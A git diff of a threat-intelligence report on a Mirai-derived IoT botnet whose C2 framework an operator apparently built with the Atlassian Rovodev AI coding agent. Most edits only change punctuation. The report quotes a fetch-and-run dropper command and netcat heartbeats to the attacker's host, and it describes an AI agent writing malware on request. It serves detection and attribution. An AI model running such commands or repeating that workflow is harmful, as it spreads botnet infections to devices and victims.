@@ -413,7 +413,7 @@ The authorship chain is preserved intact at four layers of evidence:
 The text is the smoking-gun artifact for AI-Augmented Offensive Operations attribution to this operator. It cannot be plausibly reframed as anything other than a malware-development prompt: the operator references a public C2-leak repository, requests broad exploit scanning, requests credential harvesting (`automatic give me login`), requests Discord integration (which becomes the customer interface), and requests anti-forensic cleanup (`clean files not needed`). Operator language tells: lowercase `i` self-reference, comma splices, typo `lableded`, single-paragraph stream of consciousness, English-native operator with informal writing register.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-whatineed-operator-prompt.png" | relative_url }}" alt="Captured contents of whatineed.txt — the operator's natural-language specification to Atlassian Rovodev requesting a fully-built C2 framework, exploit scanner, credential harvester, and Discord integration with the operator's own Discord user ID embedded directly in the prompt.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-whatineed-operator-prompt.png" | relative_url }}" alt="Captured contents of whatineed.txt: the operator's natural-language specification to Atlassian Rovodev requesting a fully-built C2 framework, exploit scanner, credential harvester, and Discord integration with the operator's own Discord user ID embedded directly in the prompt.">
   <figcaption><em>Figure 2: The operator's verbatim natural-language prompt to Atlassian Rovodev (<code>whatineed.txt</code>), captured intact from the exposed open directory. The lowercase self-reference, single-paragraph stream-of-consciousness writing, and the embedded Discord operator ID (<code>1441591352927326259</code>) make this the smoking-gun authorship artifact for the AI-Augmented Offensive Operations attribution.</em></figcaption>
 </figure>
 
@@ -456,7 +456,7 @@ Let me start Phase 1 now...
 The output is classic LLM style: ASCII-box header, uniform `✅` bullets, escalating phase labeling, first-person closure (`Let me start Phase 1 now...`). Phase 3 explicitly lists customer-role tiers, `Admin/VIP/Verified/Free`, anchoring the DDoS-as-a-Service framing at the planning level. Phase 2 references the backup VPS `87.106.54.213`, confirms the operator's second IONOS VPS used for redundancy and dual scanning, same /16 as primary host. Operator-stated infection-rate target: `1000+/day with real devices`.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-implementation-plan-ai-output.png" | relative_url }}" alt="Captured contents of IMPLEMENTATION_PLAN.txt — Rovodev's AI-generated four-phase deployment plan response to the operator's whatineed.txt prompt, written in classic LLM ASCII-box style with checkmark bullets and explicit DDoS-as-a-Service customer tier labels (Admin/VIP/Verified/Free).">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-implementation-plan-ai-output.png" | relative_url }}" alt="Captured contents of IMPLEMENTATION_PLAN.txt: Rovodev's AI-generated four-phase deployment plan response to the operator's whatineed.txt prompt, written in classic LLM ASCII-box style with checkmark bullets and explicit DDoS-as-a-Service customer tier labels (Admin/VIP/Verified/Free).">
   <figcaption><em>Figure 3: Rovodev's <code>IMPLEMENTATION_PLAN.txt</code> output, the AI's four-phase deployment plan generated from the operator's natural-language spec. Phase 3 explicitly lists customer-role tiers (<code>Admin/VIP/Verified/Free</code>), direct evidence that the AI participated in productizing the DDoS-as-a-Service tier model, not just authoring isolated code fragments.</em></figcaption>
 </figure>
 
@@ -480,7 +480,7 @@ The fourth layer is the AI runtime log, `rovodev.log`. That 8.5 MB CLI runtime l
 | `encrypted_agent.py` | DEFINITE AI-authored (Rovodev session tool-call evidence) | Framework encrypted agent |
 | `stealth_agent.py` | DEFINITE AI-authored (Rovodev session tool-call evidence, ESCALATED prompt produced anti-analysis) | Framework stealth agent |
 
-### 4.5 AI-Generated Offensive Code Structural Signature — Universal Subset
+### 4.5 AI-Generated Offensive Code Structural Signature: Universal Subset
 
 > **Analyst note:** This subsection documents the cross-3-operator validation of a five-criteria universal subset of the AI-Generated Offensive Code Structural Signature. The signature is a TTP-detection rubric defenders can apply to suspected operator code. It is a downstream artifact of shared AI-tool training patterns. It is NOT evidence of operator coordination across the three validating cases. The validating cases share zero overlap in language, country, target sector, motivation, or AI tool vendor.
 
@@ -567,22 +567,22 @@ The four-tier infrastructure architecture:
 **Direct evidence: Hunt.io enrichment of the parasitic CNC host.** Three Hunt.io history panels confirm the parasitic-CNC-on-legit-VPS pattern at evidentiary depth:
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-port-history-eol-services.png" | relative_url }}" alt="Hunt.io port history panel for 165.227.175.161 showing TCP/22 OpenSSH 7.6p1 Ubuntu (EOL April 2023), TCP/3306 MariaDB 10.2.44 (EOL May 2022), TCP/80 + TCP/443 OpenResty, and TCP/34210 RunCloud admin — all services publicly exposed on the host for years before the parasitic CNC was planted.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-port-history-eol-services.png" | relative_url }}" alt="Hunt.io port history panel for 165.227.175.161 showing TCP/22 OpenSSH 7.6p1 Ubuntu (EOL April 2023), TCP/3306 MariaDB 10.2.44 (EOL May 2022), TCP/80 + TCP/443 OpenResty, and TCP/34210 RunCloud admin, all services publicly exposed on the host for years before the parasitic CNC was planted.">
   <figcaption><em>Figure 4: Hunt.io port history for the parasitic CNC host <code>165.227.175.161</code> (compromised GetYourGroup tourism VPS). Long-EOL OpenSSH 7.6p1 + publicly-exposed MariaDB 10.2.44 are credential-attack-viable compromise vectors; the operator's parasitic CNC daemon on TCP/23 was planted alongside the legitimate tourism services without disturbing them.</em></figcaption>
 </figure>
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-ssh-keys-4year-stable.png" | relative_url }}" alt="Hunt.io SSH host key history panel for 165.227.175.161 showing the same three SSH host keys present continuously for 4+ years — evidence the host has not been rebuilt since at least 2022 and that any compromise predating Hunt.io's coverage window persists across the entire observation period.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-ssh-keys-4year-stable.png" | relative_url }}" alt="Hunt.io SSH host key history panel for 165.227.175.161 showing the same three SSH host keys present continuously for 4+ years, evidence the host has not been rebuilt since at least 2022 and that any compromise predating Hunt.io's coverage window persists across the entire observation period.">
   <figcaption><em>Figure 5: Hunt.io SSH host key history for <code>165.227.175.161</code>, the same three SSH host keys (RSA + ECDSA + ED25519) have been stable for 4+ years. The host has not been rebuilt; any compromise predating Hunt.io's coverage window persists across the entire observation period. This is the SSH-key cross-pivot that surfaced the sibling host at <code>188.166.194.243</code> (Figure 7).</em></figcaption>
 </figure>
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-ssl-history-4year-letsencrypt.png" | relative_url }}" alt="Hunt.io SSL certificate history panel for 165.227.175.161 showing 4 years of continuously-renewed Let's Encrypt certificates for auvergne-rhone-alpes-for-groups.com on TCP/443 — direct evidence the host has been a legitimate production tourism server throughout the parasitic-CNC presence on TCP/23.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/cnc-165-ssl-history-4year-letsencrypt.png" | relative_url }}" alt="Hunt.io SSL certificate history panel for 165.227.175.161 showing 4 years of continuously-renewed Let's Encrypt certificates for auvergne-rhone-alpes-for-groups.com on TCP/443, direct evidence the host has been a legitimate production tourism server throughout the parasitic-CNC presence on TCP/23.">
   <figcaption><em>Figure 6: Hunt.io SSL certificate history for <code>165.227.175.161</code>, 4 years of continuously-renewed Let's Encrypt certificates for the tourism site <code>auvergne-rhone-alpes-for-groups.com</code> on TCP/443. The host is a legitimate production tourism server, not a dedicated CNC. Defender takedown coordination must notify the tourism victim (GetYourGroup GmbH) before any DigitalOcean Trust & Safety action to prevent business collateral.</em></figcaption>
 </figure>
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/sibling-188-166-194-243-getyourgroup-28domains.png" | relative_url }}" alt="Hunt.io domain enumeration for sibling host 188.166.194.243 showing 28 GetYourGroup tourism domains (france-for-groups.com, paris-region-for-groups.com, occitanie-for-groups.com, burgundy-for-groups.com, getyourgroup.de, gyg-dev.de, and more) — establishing GetYourGroup GmbH as the legitimate owner of both 165.227.175.161 and 188.166.194.243.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/sibling-188-166-194-243-getyourgroup-28domains.png" | relative_url }}" alt="Hunt.io domain enumeration for sibling host 188.166.194.243 showing 28 GetYourGroup tourism domains (france-for-groups.com, paris-region-for-groups.com, occitanie-for-groups.com, burgundy-for-groups.com, getyourgroup.de, gyg-dev.de, and more), establishing GetYourGroup GmbH as the legitimate owner of both 165.227.175.161 and 188.166.194.243.">
   <figcaption><em>Figure 7: Hunt.io domain enumeration for the sibling host <code>188.166.194.243</code> (surfaced via the matching SSH host keys in Figure 5) revealing 28 GetYourGroup tourism domains. This establishes GetYourGroup GmbH (German group-travel booking platform) as the legitimate owner of both hosts, the operator's parasitic CNC on <code>165.227.175.161</code> sits on the tourism platform's production infrastructure. The sibling identification was the ruling evidence for the early-investigation retraction from "operator cloned infrastructure" to "operator compromised legitimate tourism VPS."</em></figcaption>
 </figure>
 
@@ -686,7 +686,7 @@ do {
 
 This prevents the IoT device from auto-rebooting, keeps the infection persistent across what would otherwise be a watchdog-triggered reset cycle. Mirai-canonical persistence pattern on routers / DVRs / IP cameras. The bot also opens `/dev/misc/watchdog` (alternative path on some IoT devices).
 
-### 4.9 stealth_agent.py — Escalated-Prompt AI Authoring
+### 4.9 stealth_agent.py: Escalated-Prompt AI Authoring
 
 > **Analyst note:** This subsection documents the operator's escalated AI-prompting tier, direct file_write tool-call evidence in the captured Rovodev session JSON shows that `stealth_agent.py` was created via the AI tool call with `initial_content` payload that included anti-analysis content, persistence vectors, self-destruct routine, and polymorphic payload generation. This refines the field's understanding of the AI-Generated Code Signature: criterion #4 ("zero anti-analysis") is prompt-conditional, not structural.
 
@@ -735,7 +735,7 @@ Approach for each framework file:
 
 The result: five framework files (`master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, `encrypted_agent.py`, `stealth_agent.py`) plus three standalone scripts (`mirai_clone.py`, `web_scraper_bot.py`, `persistent_bot.sh`) DEFINITE AI-authored. Each one is documented in Section 4.4 with SHA-256 + scoring evidence + Hunt.io classifier brief.
 
-### 5.2 Bash Dropper Static Analysis — `persistent_bot.sh`
+### 5.2 Bash Dropper Static Analysis: `persistent_bot.sh`
 
 The `persistent_bot.sh` bash installer (SHA `4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b`) plants persistence across five independent vectors. The script is operator-deployable on any Linux IoT host via the `bot.sh` HTTP distribution channel (`wget -qO- http://87.106.143.220/bot.sh | bash`). Capability inventory:
 
@@ -775,11 +775,11 @@ It generates a bot ID with `BOT_ID="bot_$(cat /proc/sys/kernel/random/uuid 2>/de
 Heartbeat cadence: 30 seconds. Both messages sent via `nc -w 5 $CNC_IP $CNC_PORT` to `87.106.143.220:1337`.
 
 <figure style="text-align: center; margin: 2em 0;">
-  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-persistent-bot-dual-channel-cnc.png" | relative_url }}" alt="Excerpt of persistent_bot.sh showing the dual-channel CNC architecture — JSON bot_register and heartbeat payloads, vendor-detection logic for MikroTik/OpenWrt/D-Link/Hikvision targets, and the 30-second heartbeat cadence over TCP/1337 to 87.106.143.220.">
+  <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/rovodev-persistent-bot-dual-channel-cnc.png" | relative_url }}" alt="Excerpt of persistent_bot.sh showing the dual-channel CNC architecture: JSON bot_register and heartbeat payloads, vendor-detection logic for MikroTik/OpenWrt/D-Link/Hikvision targets, and the 30-second heartbeat cadence over TCP/1337 to 87.106.143.220.">
   <figcaption><em>Figure 9: Source excerpt of <code>persistent_bot.sh</code>, the 5-vector Linux persistence installer authored by Atlassian Rovodev. The script demonstrates the operator's bespoke vendor-detection logic, JSON-over-TCP bot-registration protocol to the operator-owned Matrix C2 host, and the dual-channel CNC design that defenders should hunt for combinations of (five persistence vectors with the same shared <code>bot.sh</code> reseed URL).</em></figcaption>
 </figure>
 
-### 5.3 ELF Binary Walkthrough — Naku.arm
+### 5.3 ELF Binary Walkthrough: Naku.arm
 
 The Naku.arm binary (SHA `64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383`, 64,784 bytes, 31 strings, 22 XOR-0x54 hits) is the primary target for byte-level reverse engineering because (a) ARM is the most-deployed IoT architecture in the wild, (b) the binary is stripped (unlike arm7 which retains debug symbols), so it represents what defenders will observe on actual victim devices, and (c) the recovered operator-bespoke modifications transfer to the other 10 architectures (cross-arch string-comparison tables in Section 4.1).
 
@@ -801,7 +801,7 @@ Key recovered findings from the ARM ELF analysis (all DEFINITE):
 - Argv-based infection-source tagging confirmed via disassembly of argv-processing block
 - Watchdog-disable persistence loop confirmed via disassembly of post-init pre-CNC-connect code
 
-### 5.4 Credential Brute-List — XOR-0x42 Region
+### 5.4 Credential Brute-List: XOR-0x42 Region
 
 From the XOR-0x42 region of Naku.arm (Mirai's `add_auth_entry()`-equivalent table):
 
@@ -853,7 +853,7 @@ Three Naku samples produced full Zenbox Linux behavioral reports; the other seve
 - **Suricata alerts (HIGH severity):** `ET EXPLOIT Realtek SDK Miniigd UPnP SOAP Command Execution CVE-2014-8361 - Outbound`; `TGI HUNT HTTP Request to 127.0.0.1`.
 - **Spamhaus DROP listed traffic**: the bot's scan traffic hit Spamhaus block lists (groups 2, 4-6, 13, 23, 25, 29, 33-35, 58), meaning the operator's bot is generating outbound traffic in IP ranges that defenders should block at perimeter regardless of port/protocol.
 
-### 6.2 32-byte Handshake Protocol — Matrix C2 Wire Format
+### 6.2 32-byte Handshake Protocol: Matrix C2 Wire Format
 
 > **Analyst note:** This section describes the message format infected bots use to register and check in with the operator's command-and-control server. The format is simple JSON over plain TCP (readable by anyone watching the traffic) and that itself is a defender signal: stock Matrix C2 traffic is plaintext and pattern-matches cleanly on a single keyword like `bot_register`.
 
@@ -899,7 +899,7 @@ Buffer is bounded at 1024 bytes per command (the recv-loop check in `main()`).
 **Operator-bespoke modification (high-value for detection):** Option keys are LENGTH-PREFIXED STRINGS in this Naku variant, not single-byte enum values as in stock Mirai/Sora. Defenders using Mirai-protocol-aware IDS rules WILL miss this traffic. Naku-specific signatures are required.
 
 <figure style="text-align: center; margin: 2em 0;">
- <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/naku-arm-attack-parse-decompiled.png" | relative_url }}" alt="Decompilation of FUN_000082bc in Naku.arm, the operator's attack_parse() function, showing the modified CNC wire format with length-prefixed string option keys replacing stock Mirai's single-byte enum values — the operator-bespoke protocol modification that defeats Mirai-protocol-aware IDS rules.">
+ <img src="{{ "/assets/images/rovodev-mirai-matrix-c2-87.106.143.220/naku-arm-attack-parse-decompiled.png" | relative_url }}" alt="Decompilation of FUN_000082bc in Naku.arm, the operator's attack_parse() function, showing the modified CNC wire format with length-prefixed string option keys replacing stock Mirai's single-byte enum values, the operator-bespoke protocol modification that defeats Mirai-protocol-aware IDS rules.">
  <figcaption><em>Figure 10: Decompilation of <code>FUN_000082bc</code> (Naku.arm's <code>attack_parse()</code> equivalent) showing the operator-bespoke CNC wire-format modification, option keys parsed as length-prefixed strings rather than stock Mirai's single-byte enum values. This single byte-level change is the highest-value detection differentiator for the Naku variant: published Mirai-protocol-aware IDS rules will silently miss this command-channel traffic, so Naku-specific Suricata signatures (Section 10) are required.</em></figcaption>
 </figure>
 
@@ -951,14 +951,14 @@ The full IOC feed is at [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs
 
 ---
 
-## 9. Threat Actor Assessment — UTA-2026-014
+## 9. Threat Actor Assessment: UTA-2026-014
 {: .hl-tier-2}
 
 > **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-014 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports. It is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.
 
 The overall operator-profile claim (English-speaking Hybrid AI-augmented solo-or-small-team operator) is held at **LOW 60% within the canonical LOW band (50-70%)**; this sub-report establishes the canonical Threat Actor Assessment for the Case 3 operator. Specific sub-claims hold at higher confidence: the HYBRID AI-augmented operator class assignment holds at HIGH (~80%); Atlassian Rovodev AI co-authoring of the Matrix C2 framework is DEFINITE (95%); the AI-Generated Offensive Code Structural Signature universal subset is DEFINITE for the cross-3-operator ecosystem-level claim; the solo-versus-small-team discrimination favors solo at HIGH (~80%); real-world identity remains INSUFFICIENT.
 
-### 9.1 Hybrid AI-Augmented Operator Class — Phase 7 ACH Result
+### 9.1 Hybrid AI-Augmented Operator Class: Phase 7 ACH Result
 
 The Phase 7 Analysis of Competing Hypotheses (ACH) resolves to **H1: HYBRID AI-augmented solo-or-small-team operator with Mirai source-tree literacy + AI tooling for capability extension** at ~80% probability. The competing hypotheses:
 
@@ -999,7 +999,7 @@ The operator account ID `1441591352927326259` is operator-self-confirmed in `wha
 - Does NOT discriminate operator class: fresh-persona consistent with either a new operator OR an experienced operator burning previous personas (INSUFFICIENT evidence to choose)
 - Discord Trust & Safety subpoena timing window is feasible at investigation date but degrades over time
 
-### 9.3 Operator Geography Assessment — INSUFFICIENT
+### 9.3 Operator Geography Assessment: INSUFFICIENT
 
 Operator geography remains **INSUFFICIENT (0%)** under the project-standard Attribution Confidence Scale:
 
@@ -1177,7 +1177,7 @@ This section organizes the report's findings by confidence level using the proje
 
 The following gaps in this investigation are documented for downstream defender awareness, follow-up coordination, and methodological transparency.
 
-### 12.1 GitHub keyosbuff/C2-Leak Repository DELETED — Upstream Mirai Source Comparison Gap
+### 12.1 GitHub keyosbuff/C2-Leak Repository DELETED: Upstream Mirai Source Comparison Gap
 
 > **Analyst note:** The operator told the AI tool to copy a public GitHub repository as the starting point for the Matrix C2 framework. That repository has since been deleted, so investigators cannot compare what the operator wrote against what was inherited from the upstream source. The practical consequence: we cannot fully separate operator-original code from copied code, which limits attribution precision.
 
@@ -1194,11 +1194,11 @@ One follow-up worth doing is a Wayback Machine archive snapshot query for `githu
 
 Direct consequence of 12.1 above. The Matrix C2 framework's wire protocol (JSON-over-TCP on TCP/1337; pipe-delimited variant in `mirai_clone.py`) cannot be compared to a known upstream baseline. INSUFFICIENT evidence to discriminate between two readings, the operator either authored the wire protocol via Rovodev or inherited it from `keyosbuff/C2-Leak`; current evidence is consistent with either reading.
 
-### 12.3 Pandora 11-Arch IoT Evolution — No Prior Public Documentation
+### 12.3 Pandora 11-Arch IoT Evolution: No Prior Public Documentation
 
 Doctor Web's September 2023 Pandora-Mirai disclosure documented the family as Android-TV scope only. No prior public source documents the four-year evolution arc from Android-TV-only to broad IoT scope across eleven CPU architectures (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86). Based on the Tier 1-3 public-source sweep, this investigation is the first public characterization of the evolution arc (HIGH confidence on the sweep-completeness basis); the byte-level evidence (XOR-deobfuscated string tables, recovered main() disassembly, cross-architecture string-comparison tables across all 11 binaries) is documented at sufficient detail for downstream vendor consumption (Doctor Web notification recommended).
 
-### 12.4 Parasitic-CNC-on-Legit-VPS OPSEC Pattern — No Mirai-Family Literature Precedent
+### 12.4 Parasitic-CNC-on-Legit-VPS OPSEC Pattern: No Mirai-Family Literature Precedent
 
 The pattern of an operator planting a Mirai CNC daemon on a legitimate business VPS (German tourism, in this case) while the host continues to serve the legitimate business has no documented prior art in Mirai-family literature. Closest documented adjacents are "Mirai operator uses bulletproof hosting" (opposite tradecraft) and generic compromise-and-pivot patterns (not Mirai-specific). The defender implication: any unpatched commercial VPS (multi-year-old Ubuntu LTS, EOL MariaDB / OpenSSH) is candidate parasitic-CNC infrastructure.
 
